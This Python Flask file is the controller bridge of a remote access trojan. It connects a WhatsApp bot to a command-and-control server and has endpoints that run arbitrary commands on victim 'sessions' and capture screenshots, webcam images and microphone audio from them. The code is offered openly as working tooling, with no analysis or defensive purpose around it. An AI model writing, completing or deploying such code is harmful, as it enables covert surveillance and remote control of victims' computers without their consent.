"""
═══════════════════════════════════════════════════════════════
    RAT API BRIDGE - HTTP API for WhatsApp Bot Integration
    Connects Node.js bot to Python C2 server
═══════════════════════════════════════════════════════════════
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import socket
import json
import base64
import threading
import time
from datetime import datetime
from cryptography.fernet import Fernet
import os

app = Flask(__name__)
CORS(app)

# ═══════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════

C2_SERVER_HOST = '127.0.0.1'
C2_SERVER_PORT = 4444
ENCRYPTION_KEY = b'YOUR_ENCRYPTION_KEY_HERE'

# Session storage
SESSIONS = {}
ACTIVE_SESSION = None

# ═══════════════════════════════════════════════════════════════
# ENCRYPTION HELPERS
# ═══════════════════════════════════════════════════════════════

def encrypt_data(key, data):
    f = Fernet(key)
    if isinstance(data, bytes):
        return f.encrypt(data)
    return f.encrypt(data.encode())

def decrypt_data(key, data):
    f = Fernet(key)
    return f.decrypt(data).decode()

# ═══════════════════════════════════════════════════════════════
# C2 COMMUNICATION
# ═══════════════════════════════════════════════════════════════

def send_command_to_c2(session_id, command, timeout=30):
    """Send command to C2 server and get response"""
    try:
        # Connect to C2 server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((C2_SERVER_HOST, C2_SERVER_PORT))
        s.settimeout(timeout)
        
        # Send command
        encrypted = encrypt_data(ENCRYPTION_KEY, command)
        s.send(encrypted)
        
        # Receive response
        response_data = s.recv(10 * 1024 * 1024)  # 10MB buffer
        response = decrypt_data(ENCRYPTION_KEY, response_data)
        
        s.close()
        return {'success': True, 'data': response}
        
    except socket.timeout:
        return {'success': False, 'error': 'Command timeout'}
    except Exception as e:
        return {'success': False, 'error': str(e)}

# ═══════════════════════════════════════════════════════════════
# API ENDPOINTS
# ═══════════════════════════════════════════════════════════════

@app.route('/api/status', methods=['GET'])
def status():
    """Check API status"""
    return jsonify({
        'status': 'online',
        'timestamp': datetime.now().isoformat(),
        'c2_server': f"{C2_SERVER_HOST}:{C2_SERVER_PORT}",
        'active_sessions': len(SESSIONS)
    })

@app.route('/api/sessions', methods=['GET'])
def get_sessions():
    """Get list of active sessions"""
    # Mock data for now - integrate with actual C2 server
    sessions = [
        {
            'id': 1,
            'addr': '192.168.1.100:54321',
            'info': '[ADMIN] Connection from DESKTOP-ABC',
            'connected_at': '10:30:15',
            'active': True
        },
        {
            'id': 2,
            'addr': '192.168.1.101:54322',
            'info': '[USER] Connection from LAPTOP-XYZ',
            'connected_at': '10:35:42',
            'active': True
        }
    ]
    
    return jsonify({
        'success': True,
        'sessions': sessions
    })

@app.route('/api/session/<int:session_id>/command', methods=['POST'])
def execute_command(session_id):
    """Execute command on specific session"""
    try:
        data = request.json
        command = data.get('command')
        timeout = data.get('timeout', 30)
        
        if not command:
            return jsonify({
                'success': False,
                'error': 'No command provided'
            }), 400
        
        # Send command to C2
        result = send_command_to_c2(session_id, command, timeout)
        
        return jsonify(result)
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/session/<int:session_id>/screenshot', methods=['GET'])
def get_screenshot(session_id):
    """Get screenshot from session"""
    try:
        # Execute screenshot command
        result = send_command_to_c2(session_id, 'screenshot', timeout=60)
        
        if not result['success']:
            return jsonify(result), 500
        
        # The result data should contain base64 image
        image_base64 = result.get('data', '')
        
        if not image_base64:
            return jsonify({
                'success': False,
                'error': 'No image data received'
            }), 500
        
        return jsonify({
            'success': True,
            'image': image_base64,
            'format': 'base64'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/session/<int:session_id>/webcam', methods=['GET'])
def get_webcam(session_id):
    """Get webcam capture from session"""
    try:
        result = send_command_to_c2(session_id, 'webcam', timeout=60)
        
        if not result['success']:
            return jsonify(result), 500
        
        image_base64 = result.get('data', '')
        
        if not image_base64:
            return jsonify({
                'success': False,
                'error': 'No webcam data received'
            }), 500
        
        return jsonify({
            'success': True,
            'image': image_base64,
            'format': 'base64'
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

@app.route('/api/session/<int:session_id>/audio/<int:duration>', methods=['GET'])
def get_audio(session_id, duration):
    """Record audio from session"""
    try:
        result = send_command_to_c2(session_id, f'record {duration}', timeout=duration+30)
        
        if not result['success']:
            return jsonify(result), 500
        
        audio_base64 = result.get('data', '')
        
        if not audio_base64:
            return jsonify({
                'success': False,
                'error': 'No audio data received'
            }), 500
        
        return jsonify({
            'success': True,
            'audio': audio_base64,
            'format': 'base64',
            'duration': duration
        })
        
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500

# ═══════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════

if __name__ == '__main__':
    print("""
╔═══════════════════════════════════════════════════════════╗
║         RAT API BRIDGE - WhatsApp Integration             ║
║                    Port: 5000                             ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    print(f"[*] C2 Server: {C2_SERVER_HOST}:{C2_SERVER_PORT}")
    print(f"[*] API listening on http://0.0.0.0:5000")
    print(f"[*] Ready for WhatsApp bot connections!\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False)